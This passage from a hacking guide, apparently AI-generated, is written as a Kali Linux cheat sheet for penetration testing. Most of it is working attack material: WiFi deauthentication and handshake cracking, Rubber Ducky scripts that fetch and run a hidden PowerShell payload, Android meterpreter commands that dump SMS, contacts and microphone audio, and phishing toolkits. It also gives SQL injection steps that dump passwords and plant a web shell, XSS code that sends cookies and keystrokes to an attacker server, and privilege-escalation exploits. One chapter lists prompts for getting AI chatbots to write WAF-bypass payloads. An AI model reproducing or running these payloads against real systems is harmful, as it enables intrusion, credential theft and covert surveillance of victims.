
```bash
sudo tcpdump -i eth0 -w capture.pcap         # capture to file
sudo tcpdump -i eth0 host TARGET             # filter by host
sudo tcpdump -i eth0 port 80                 # filter by port
sudo tcpdump -i eth0 -A | grep -i "pass"    # find passwords
```

---

## CATEGORY 6: WIRELESS HACKING

### Aircrack-ng Suite

```bash
# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Scan networks
sudo airodump-ng wlan0mon

# Step 3: Target specific network
sudo airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# Step 4: Deauth attack (force handshake)
sudo aireplay-ng --deauth 20 -a BSSID wlan0mon

# Step 5: Crack handshake
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Or with hashcat (faster):
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt

# Step 6: Stop monitor mode
sudo airmon-ng stop wlan0mon
```

---

### Wifite — Automated WiFi Auditing

```bash
sudo wifite --kill                            # auto mode
sudo wifite -e "NetworkName"                  # target specific
```

---

### Wifiphisher — Evil Twin Attack

```bash
sudo wifiphisher
# Creates fake AP → deauths from real → captures credentials
```

---

## CATEGORY 7: PRIVILEGE ESCALATION

### LinPEAS — Linux Enumeration

```bash
# Transfer to target
# On attacker: python3 -m http.server 8000
# On target: wget http://ATTACKER:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt

# RED/YELLOW = likely priv esc vector!
```

### Key Linux Priv Esc Checks

```bash
sudo -l                                       # sudo permissions
find / -perm -4000 -type f 2>/dev/null       # SUID binaries
cat /etc/crontab                              # cron jobs
getcap -r / 2>/dev/null                      # capabilities
uname -r                                      # kernel version
# Check GTFOBins: https://gtfobins.github.io/
```

### WinPEAS — Windows Enumeration

```bash
.\winPEASx64.exe                              # run on Windows target
```

---

## CATEGORY 8: USB & PHYSICAL ATTACKS

### USB Rubber Ducky Payloads

```
# Reverse Shell in 3 seconds
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
ENTER

# Dump WiFi Passwords
DELAY 1000
GUI r
DELAY 500
STRING cmd /c "for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr Profile') do netsh wlan show profile name=%a key=clear" >> %TEMP%\wifi.txt
ENTER
```

### DigiSpark BadUSB ($3 Arduino Alternative)

```cpp
#include "DigiKeyboard.h"
void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell -ep bypass -w hidden -c \"IEX(...)\"");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
```

### Flipper Zero

```
Can do: RFID/NFC cloning, IR replay, Sub-GHz radio,
        BadUSB mode, GPIO hardware hacking
Buy: ~$170 online
Learn: https://docs.flipper.net/
```

---

## CATEGORY 9: MOBILE HACKING

### ADB — Android Debug Bridge

```bash
adb devices                                   # list devices
adb shell                                     # open shell
adb pull /sdcard/DCIM/                        # download photos
adb pull /sdcard/WhatsApp/                    # WhatsApp data
adb install malicious.apk                     # install app
adb shell screencap /sdcard/ss.png            # screenshot
adb shell screenrecord /sdcard/vid.mp4        # record screen
adb shell pm list packages                    # list apps
adb backup -all -f backup.ab                  # backup everything
```

### Android Payload

```bash
# Generate
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o evil.apk

# Listener
msfconsole -q
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST YOUR_IP
exploit

# Once connected:
dump_contacts                                 # ALL contacts
dump_sms                                      # ALL messages
dump_calllog                                  # call history
geolocate                                     # GPS location
webcam_snap                                   # take photo
record_mic -d 60                              # record mic
```

### MobSF — Mobile Security Framework

```bash
sudo docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Open http://localhost:8000 → Upload APK → Auto analysis!
```

---

## CATEGORY 10: SOCIAL ENGINEERING

### SET — Social Engineering Toolkit

```bash
sudo setoolkit
# 1 → Social Engineering Attacks
# 2 → Website Attack Vectors
# 3 → Credential Harvester
# 2 → Site Cloner
# Enter YOUR IP → Enter URL to clone
```

### Zphisher — Automated Phishing

```bash
git clone https://github.com/htr-tech/zphisher.git
cd zphisher && bash zphisher.sh
# 30+ templates: Instagram, Facebook, Google, etc.
```

### Gophish — Professional Phishing

```bash
# Download from https://getgophish.com/
./gophish
# Access https://localhost:3333
# Create campaigns, track clicks, capture creds
```

### BeEF — Browser Exploitation

```bash
sudo beef-xss
# Access http://127.0.0.1:3000/ui/panel
# Hook: <script src="http://YOUR_IP:3000/hook.js"></script>
# Control victim's browser: redirect, keylog, screenshots
```

---

## CATEGORY 11: C2 & ADVANCED

### Sliver — Modern C2

```bash
curl https://sliver.sh/install | sudo bash
sudo sliver-server
> generate --mtls YOUR_IP --save /tmp/implant
> mtls --lhost YOUR_IP --lport 443
> sessions
```

### Veil — AV Evasion

```bash
sudo apt install -y veil
veil
# Use Evasion → Select payload → Generate
```

### Shellter — PE Infector

```bash
sudo apt install -y shellter
shellter
# Inject payload into legitimate EXE
```

---

## CATEGORY 12: UTILITY TOOLS

### File Transfer Methods

```bash
# Python HTTP server
python3 -m http.server 8000

# Download
wget http://ATTACKER:8000/file
curl http://ATTACKER:8000/file -o file

# Netcat
nc -lvnp 9999 > file    # receiver
nc TARGET 9999 < file    # sender

# SCP
scp file user@target:/path/
```

### SSH Tunneling

```bash
ssh -L 8080:internal:80 user@target          # local forward
ssh -R 8080:localhost:80 user@target          # remote forward
ssh -D 9050 user@target                      # SOCKS proxy
```

### Proxychains

```bash
# Edit /etc/proxychains4.conf → add your proxy
proxychains nmap TARGET
proxychains firefox
```

### CyberChef (Online)

```
https://gchq.github.io/CyberChef/
Encode/decode: Base64, URL, Hex, ROT13, etc.
```

### RevShells (Online)

```
https://www.revshells.com/
Generate any reverse shell one-liner!
```

---

\newpage

# CHAPTER 6: SQL INJECTION — COMPLETE GUIDE

## Detection

```
'                               # single quote error
" OR ""="                       # always true
' OR '1'='1                     # login bypass
' AND 1=1-- -                   # true condition
' AND 1=2-- -                   # false → different response = SQLi!
```

## UNION-Based Extraction (Step by Step)

```sql
-- 1. Find column count
' ORDER BY 1-- -    ✅
' ORDER BY 2-- -    ✅
' ORDER BY 3-- -    ✅
' ORDER BY 4-- -    ❌ Error → 3 columns!

-- 2. Find displayable columns
' UNION SELECT 1,2,3-- -

-- 3. Database info
' UNION SELECT 1,version(),database()-- -

-- 4. List all databases
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -

-- 5. List tables
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- 6. List columns
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- 7. DUMP DATA!
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

-- Read server files!
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

-- Write web shell!
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

\newpage

# CHAPTER 7: XSS PAYLOADS

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie stealing -->
<script>fetch('https://YOUR_SERVER/steal?c='+document.cookie)</script>

<!-- Keylogger -->
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://YOUR_SERVER/log?k='+e.key);
});
</script>

<!-- WAF Bypass -->
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

---

\newpage

# CHAPTER 8: PRIVILEGE ESCALATION CHEATSHEET

## Linux

```bash
# ALWAYS CHECK FIRST:
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null
uname -r

# Sudo abuse (GTFOBins):
sudo vim -c '!bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd  → !bash

# Kernel exploits:
# PwnKit (CVE-2021-4034) — works on most Linux!
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

## Windows

```powershell
whoami /priv                                  # check privileges
whoami /groups                                # check groups
systeminfo                                    # OS info + patches

# If SeImpersonatePrivilege:
.\PrintSpoofer.exe -i -c cmd                  # instant SYSTEM!
.\GodPotato.exe -cmd "cmd /c whoami"

# Pass the Hash:
impacket-psexec admin@TARGET -hashes :HASH
evil-winrm -i TARGET -u admin -H HASH
```

---

\newpage

# CHAPTER 9: AI FOR HACKING

## Using ChatGPT/Claude for Hacking

```
USEFUL PROMPTS:

1. "What vulnerabilities exist in Apache 2.4.49? Give CVEs and exploitation steps."

2. "Write a Python script that checks a list of URLs for open redirect vulnerabilities."

3. "Generate 20 XSS payloads that bypass Cloudflare WAF."

4. "Analyze these Nmap results and suggest attack vectors: [paste results]"

5. "Write a professional pentest report for an SQL injection found at /api/login."

6. "Review this PHP code for OWASP Top 10 vulnerabilities: [paste code]"

7. "Explain CVE-XXXX-XXXX step by step with exploitation guide."

8. "Write a Nuclei template to detect exposed .env files."
```

## Run AI Locally (Private!)

```bash
# Install Ollama on Mac
# https://ollama.com/download

ollama run llama3        # Meta's Llama 3
ollama run codellama     # Code-focused model

# Local AI = no data sent to cloud!
# Perfect for analyzing sensitive pentest data
```

---

\newpage

# CHAPTER 10: BUG BOUNTY & CAREER

## Bug Bounty Platforms

| Platform | URL |
|----------|-----|
| HackerOne | https://hackerone.com |
| Bugcrowd | https://bugcrowd.com |
| Intigriti | https://intigriti.com |
| Open Bug Bounty | https://openbugbounty.org |

## Average Payouts

| Severity | Payout |
|----------|--------|
| Critical (RCE) | $5,000 - $100,000+ |
| High (SQLi, IDOR) | $1,000 - $10,000 |
| Medium (XSS) | $250 - $2,000 |
| Low (Info Disclosure) | $50 - $500 |

## Certification Path

1. **eJPT** ($249) — Best beginner cert
2. **CompTIA Security+** ($392) — Industry standard
3. **PNPT** ($399) — Practical, affordable
4. **OSCP** ($1,649) — Gold standard

## Career Salaries (India)

| Role | Salary |
|------|--------|
| Junior Pentester | 5-10 LPA |
| Security Engineer | 12-25 LPA |
| Senior Pentester | 20-40 LPA |
| Bug Bounty Hunter | 10-50+ LPA |
| CISO | 40-1Cr+ LPA |

---

\newpage

# CHAPTER 11: VIDEO RESOURCES

## Must-Watch Courses (FREE)

1. **TCM Security — Practical Ethical Hacking (15h)**
   https://www.youtube.com/watch?v=3FNYvj2U0HM

2. **freeCodeCamp — Full Ethical Hacking (15h)**
   https://www.youtube.com/watch?v=3Kq1MIfTWCE

3. **freeCodeCamp — Kali Linux Tutorial (4h)**
   https://www.youtube.com/watch?v=lZAoFs75_cs

4. **freeCodeCamp — Networking (9h)**
   https://www.youtube.com/watch?v=qiQR5rTSshw

## YouTube Channels

| Channel | Focus |
|---------|-------|
| NetworkChuck | Fun hacking tutorials |
| TCM Security | Practical pentesting |
| John Hammond | CTF walkthroughs |
| David Bombal | Networking + hacking |
| IppSec | HackTheBox walkthroughs |
| HackerSploit | Kali tools tutorials |
| Nahamsec | Bug bounty |
| LiveOverflow | Deep technical |
| PwnFunction | Animated vulnerability explanations |

## Online Platforms (FREE)

| Platform | URL | Best For |
|----------|-----|----------|
| TryHackMe | https://tryhackme.com | Beginners |
| HackTheBox | https://hackthebox.com | Intermediate |
| PortSwigger Academy | https://portswigger.net/web-security | Web hacking |
| PicoCTF | https://picoctf.org | CTF practice |
| OverTheWire | https://overthewire.org | Linux wargames |

## Reference Sites

| Site | URL |
|------|-----|
| GTFOBins | https://gtfobins.github.io/ |
| LOLBAS | https://lolbas-project.github.io/ |
| HackTricks | https://book.hacktricks.xyz/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| RevShells | https://www.revshells.com/ |
| CyberChef | https://gchq.github.io/CyberChef/ |
| ExploitDB | https://www.exploit-db.com/ |

---

\newpage

# CHAPTER 12: MY MASTERY PLAN

## If I Were Learning Kali Linux From Scratch

```
WEEK 1-2: FOUNDATION
├── Day 1-3: Linux commands (practice 50+ commands daily)
├── Day 4-5: Bash scripting (write 5 scripts)
├── Day 6-7: Python basics (port scanner, web scraper)
├── Day 8-10: Networking (TCP/IP, ports, Wireshark)
├── Day 11-14: Nmap mastery (scan everything in lab)

WEEK 3-4: EXPLOITATION
├── Day 15-17: Metasploit (exploit Metasploitable 2)
├── Day 18-20: Web hacking (SQLi, XSS on DVWA)
├── Day 21-23: Burp Suite + SQLMap mastery
├── Day 24-26: Privilege escalation (Linux + Windows)
├── Day 27-28: TryHackMe rooms (5-10 rooms)

WEEK 5-6: ADVANCED
├── Day 29-31: WiFi hacking (aircrack-ng suite)
├── Day 32-33: Password cracking (Hydra, John, Hashcat)
├── Day 34-36: USB attacks (DuckyScript, DigiSpark)
├── Day 37-38: Mobile hacking (Android + ADB)
├── Day 39-40: Social engineering (SET, phishing)
├── Day 41-42: HackTheBox machines

WEEK 7-8: MASTERY
├── Day 43-45: C2 frameworks (Sliver)
├── Day 46-47: AV evasion basics
├── Day 48-49: Full pentest challenge
├── Day 50-52: Bug bounty programs (start hunting!)
├── Day 53-56: CTF competitions

ONGOING:
├── 1 TryHackMe/HTB machine per week
├── PortSwigger labs (complete all)
├── Bug bounty hunting (daily)
├── Write CTF writeups
├── Get eJPT certified
```

## Daily Routine

```
Morning (1 hour):  Theory/videos
Afternoon (2 hours): Hands-on lab practice
Evening (1 hour):  CTF challenges
Night (30 min):    Notes + documentation
```

## Golden Rules

```
1. NEVER skip the basics — foundation is everything
2. Practice > Theory — do more, read less
3. Document EVERYTHING — notes, screenshots, commands
4. Join communities — Discord, Reddit, Twitter
5. Teach others — best way to learn
6. Stay legal — ALWAYS get permission
7. Be patient — mastery takes months, not days
8. Use AI as assistant — not replacement for understanding
9. Build a portfolio — writeups, GitHub, blog
10. Never stop learning — security evolves daily
```

---

**END OF GUIDE**

**Remember: With great power comes great responsibility.**
**Use your skills to PROTECT, not to HARM.**
**Be the white hat the world needs!**

---

*Generated by AI Hacking Mentor — May 2026*
*For educational and authorized testing purposes only.*
